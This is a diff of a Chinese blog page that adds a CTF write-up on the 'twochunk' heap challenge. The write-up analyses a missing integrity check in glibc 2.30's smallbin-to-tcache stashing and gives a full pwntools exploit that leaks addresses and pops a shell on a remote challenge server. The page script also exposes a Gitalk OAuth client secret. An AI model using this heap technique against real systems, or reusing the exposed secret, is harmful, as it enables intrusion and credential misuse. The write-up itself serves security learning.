@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="pwn,ctf,">
 
 
 
@@ -79,13 +79,23 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="luckyu&#39;s blog">
-<meta property="og:url" content="https://sh1ner.github.io/page/2/index.html">
+<meta name="description" content="这道twochunk是花了点时间去研究libc-2.30源码解出，算是自己第一次没用现有办法研究出的pwn堆利用题目">
+<meta name="keywords" content="pwn,ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="高校战&quot;疫&quot;ctf twochunk解析">
+<meta property="og:url" content="https://sh1ner.github.io/2020/03/10/gxzyctf2020-twochunk/index.html">
 <meta property="og:site_name" content="luckyu&#39;s blog">
+<meta property="og:description" content="这道twochunk是花了点时间去研究libc-2.30源码解出，算是自己第一次没用现有办法研究出的pwn堆利用题目">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://sh1ner.github.io/2020/03/10/gxzyctf2020-twochunk/images/1.png">
+<meta property="og:image" content="https://sh1ner.github.io/2020/03/10/gxzyctf2020-twochunk/images/2.png">
+<meta property="og:image" content="https://sh1ner.github.io/2020/03/10/gxzyctf2020-twochunk/images/3.png">
+<meta property="og:image" content="https://sh1ner.github.io/2020/03/10/gxzyctf2020-twochunk/images/4.png">
+<meta property="og:updated_time" content="2020-03-10T06:38:48.893Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="luckyu&#39;s blog">
+<meta name="twitter:title" content="高校战&quot;疫&quot;ctf twochunk解析">
+<meta name="twitter:description" content="这道twochunk是花了点时间去研究libc-2.30源码解出，算是自己第一次没用现有办法研究出的pwn堆利用题目">
+<meta name="twitter:image" content="https://sh1ner.github.io/2020/03/10/gxzyctf2020-twochunk/images/1.png">
 
 
 
@@ -115,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="https://sh1ner.github.io/page/2/">
+  <link rel="canonical" href="https://sh1ner.github.io/2020/03/10/gxzyctf2020-twochunk/">
 
 
 
 
 
-  <title>luckyu's blog</title>
+  <title>高校战"疫"ctf twochunk解析 | luckyu's blog</title>
   
 
 
@@ -140,8 +150,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -256,9 +265,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -271,7 +280,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://sh1ner.github.io/2019/07/30/2019-7-pwn-unexploit/">
+    <link itemprop="mainEntityOfPage" href="https://sh1ner.github.io/2020/03/10/gxzyctf2020-twochunk/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content>
@@ -288,9 +297,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/30/2019-7-pwn-unexploit/" itemprop="url">CTF-安恒19年7月赛-pwn</a></h1>
+          <h1 class="post-title" itemprop="name headline">高校战"疫"ctf twochunk解析</h1>
         
 
         <div class="post-meta">
@@ -302,8 +309,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-30T15:14:35+08:00">
-                2019-07-30
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-10T11:34:50+08:00">
+                2020-03-10
               </time>
             
 
@@ -340,17 +347,36 @@
       
 
       
-        
-          <p><a href="downloads/unexploit">unexploit</a></p>
-<p>IDA打开，发现危险函数read造成栈溢出</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/07/30/2019-7-pwn-unexploit/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
+        <p>这道twochunk是花了点时间去研究libc-2.30源码解出，算是自己第一次没用现有办法研究出的pwn堆利用题目</p>
+<a id="more"></a>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>直接看源码吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these "smallbins"</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	    malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+
+<p>这段代码在glibc2.30版本_int_malloc()函数中，从smallbins中申请出chunk时的一系列操作，我们分解来看：<br>首先是对该chunk进行完整性检测：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	    malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>然后进行unlink</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure>
+
+<p>接下来，根据注释可以得知，如果还存在相同字节大小的不同chunk，会将其存放进tcache。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+
+<p>整个过程是先将chunk从smallbins链中摘除再将其放入tcache，但对即将存放入tcache的chunk并没有进行完整性检测(<code>bck-&gt;fd != victim</code>)，这样就给了伪造chunk-&gt;bk的条件</p>
+<p>利用以上可以做两件事</p>
+<blockquote>
+<p>1.将fake chunk放入tcache中<br>2.可以在fake chunk-&gt;fd中写入一个地址，这个地址通常是main_arena偏移的地址</p>
+</blockquote>
+<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>构造在smallbins中有两个chunk:<br><img src="images/1.png" alt><br>修改后面进入的chunk-&gt;bk为fake chunk：<br><img src="images/2.png" alt><br>接下来我们申请出一个chunk，再次查看：<br><img src="images/3.png" alt><br><img src="images/4.png" alt><br>大功告成！</p>
+<p>注意几点：</p>
+<blockquote>
+<p>1.如果想把chunk放入tcache的同时，还要写入一个地址在fake chunk-&gt;fd中，不仅要提前设置好chunk-&gt;fd，还有chunk-&gt;bk，因为在unlink过程会访问bk（<code>bin-&gt;bk = bck;</code>)，如果是非法地址会导致程序crash。<br>2.设置好tcache剩余chunk的数量</p>
+</blockquote>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>对于这道题来讲，我们可以合理的利用这两个点来搞事情了，首先我们要先构造有两个chunk在smallbins里，而且大小要为0x90,办法有很多，我简单说一下我的思路</p>
+<blockquote>
+<p>1.利用calloc不会从tcache中申请，这样我们可以先将tcache填满再calloc申请chunk然后free掉，不会浪费我们仅有的两个位置<br>2.释放进入tcache的chunk不会与top chunk或其他bins合并<br>3.合理利用一次malloc()的机会</p>
+</blockquote>
+<p>完整exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">prog = &apos;./twochunk&apos;</span><br><span class="line">#p = process(prog)</span><br><span class="line">libc = ELF(&quot;../libc-2.30.so&quot;)</span><br><span class="line">p = remote(&quot;121.36.209.145&quot;, 9999)</span><br><span class="line">  	</span><br><span class="line">def add(idx, size):</span><br><span class="line">	p.sendlineafter(&quot;choice: &quot;, &apos;1&apos;)</span><br><span class="line">	p.sendlineafter(&quot;idx: &quot;, str(idx))</span><br><span class="line">	p.sendlineafter(&quot;size: &quot;, str(size))</span><br><span class="line">def edit(idx, content):</span><br><span class="line">	p.sendlineafter(&quot;choice: &quot;, &apos;4&apos;)</span><br><span class="line">	p.sendlineafter(&quot;idx: &quot;, str(idx))</span><br><span class="line">	p.sendafter(&quot;content: &quot;, content)</span><br><span class="line">def free(idx):</span><br><span class="line">	p.sendlineafter(&quot;choice: &quot;, &apos;2&apos;)</span><br><span class="line">	p.sendlineafter(&quot;idx: &quot;, str(idx))</span><br><span class="line">def show(idx):</span><br><span class="line">	p.sendlineafter(&quot;choice: &quot;, &apos;3&apos;)</span><br><span class="line">	p.sendlineafter(&quot;idx: &quot;, str(idx))</span><br><span class="line">def showmsg():</span><br><span class="line">	p.sendlineafter(&quot;choice: &quot;, &apos;5&apos;)</span><br><span class="line">def malloc(content):</span><br><span class="line">	p.sendlineafter(&quot;choice: &quot;, &apos;6&apos;)</span><br><span class="line">	p.sendafter(&quot;message: &quot;, content)</span><br><span class="line">def hack():</span><br><span class="line">	p.sendlineafter(&quot;choice: &quot;, &apos;7&apos;)</span><br><span class="line">def exp():</span><br><span class="line">	p.sendafter(&quot;leave your name: &quot;, p64(0x23333030-0x10)*6)</span><br><span class="line">	p.sendlineafter(&quot;message: &quot;, p64(0x23333000)*6)</span><br><span class="line">	for i in range(6):</span><br><span class="line">		add(0, 0xe9)</span><br><span class="line">		free(0)</span><br><span class="line">	for i in range(5):</span><br><span class="line">		add(0, 0x88)</span><br><span class="line">		free(0)</span><br><span class="line">	for i in range(7):</span><br><span class="line">		add(0, 0x130)</span><br><span class="line">		free(0)</span><br><span class="line">	add(0, 0xe9)</span><br><span class="line">	add(1, 0x130)</span><br><span class="line">	free(0)</span><br><span class="line">	add(0, 0x100)</span><br><span class="line">	free(0)</span><br><span class="line">	add(0, 0x130)</span><br><span class="line">	free(1)</span><br><span class="line">	add(1, 0x140)</span><br><span class="line">	free(1)</span><br><span class="line">	add(1, 0xe9)</span><br><span class="line">	free(0)</span><br><span class="line">	free(1)</span><br><span class="line">	add(0, 0xa8)</span><br><span class="line">	add(1, 0xa8)</span><br><span class="line">	free(1)</span><br><span class="line">	free(0)</span><br><span class="line">	add(1, 0x150)</span><br><span class="line">	add(0, 23333)</span><br><span class="line">	show(0)</span><br><span class="line">	heap = u64(p.recv(6)+&apos;\x00&apos;*2)</span><br><span class="line">	log.info(&quot;heap ==&gt;&quot; + hex(heap))</span><br><span class="line">	edit(0, &apos;a&apos;*416+p64(0)+p64(0x91)+p64(heap+0x1080)+p64(0x23333000-0x10))</span><br><span class="line">	free(1)</span><br><span class="line">	add(1, 0x88)</span><br><span class="line">	showmsg()</span><br><span class="line">	p.recv(0x15)</span><br><span class="line">	libc.address = u64(p.recvuntil(&apos;\x7f&apos;)[-6:]+&apos;\x00&apos;*2)-0x00007f7b2def2c60+0x7f7b2dd08000</span><br><span class="line">	log.info(&quot;libc.address ==&gt;&quot; + hex(libc.address))</span><br><span class="line">	payload = p64(libc.sym[&apos;system&apos;])+&apos;\x00&apos;*0x28+p64(0x23333048)+p64(0)+p64(0)+&apos;/bin/sh\x00&apos;</span><br><span class="line">	malloc(payload)</span><br><span class="line">	hack()</span><br><span class="line">	p.interactive()</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	exp()</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -365,139 +391,38 @@
 
     <footer class="post-footer">
       
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://sh1ner.github.io/2019/07/14/func/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content>
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="luckyu's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/14/func/" itemprop="url">函数调用过程</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-14T11:50:13+08:00">
-                2019-07-14
-              </time>
-            
-
-            
-
-            
-          </span>
-
+        <div class="post-tags">
           
-
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
           
-            
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
           
-
-          
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
+      
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
+      
       
       
 
       
-        
-          <p>1、调用者函数把被调函数所需要的参数按照与被调函数的形参顺序相反的顺序压入栈中,即:从右向左依次把被调函数所需要的参数压入栈;</p>
-<p>2、调用者函数使用call指令调用被调函数,并把call指令的下一条指令的地址当成返回地址压入栈中(这个压栈操作隐含在call指令中);</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/07/14/func/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/24/gyctf-2020/" rel="next" title="2020CTF公益赛以及针对libc2.29的一些研究">
+                <i class="fa fa-chevron-left"></i> 2020CTF公益赛以及针对libc2.29的一些研究
+              </a>
+            
           </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
 
-    
+          <span class="post-nav-divider"></span>
 
-    
-
-    
-
-    <footer class="post-footer">
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
       
 
       
-
-      
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </div>
@@ -507,14 +432,11 @@
   </article>
 
 
-    
-  </section>
 
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
-  </nav>
-
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -522,6 +444,14 @@
 
 
           
+
+  
+  <div id="gitalk-container">
+  </div>
+
+  
+  
+
 
         </div>
         
@@ -542,8 +472,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -604,6 +543,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用过程"><span class="nav-number">2.</span> <span class="nav-text">利用过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#题解"><span class="nav-number">3.</span> <span class="nav-text">题解</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -744,6 +699,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
@@ -784,6 +743,21 @@
 
 
 
+
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+   <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID: '3e46d70ce27cadc03165',
+          clientSecret: 'b49765fcc4d70e6af647ded4fd819972903ad727',
+          repo: 'sh1ner.github.io',
+          owner: 'sh1ner',
+          admin: ['sh1ner'],
+          id: location.pathname,
+          distractionFreeMode: 'true'
+        })
+        gitalk.render('gitalk-container')           
+       </script>
 
 .gt-container a{border-bottom: none;}
   
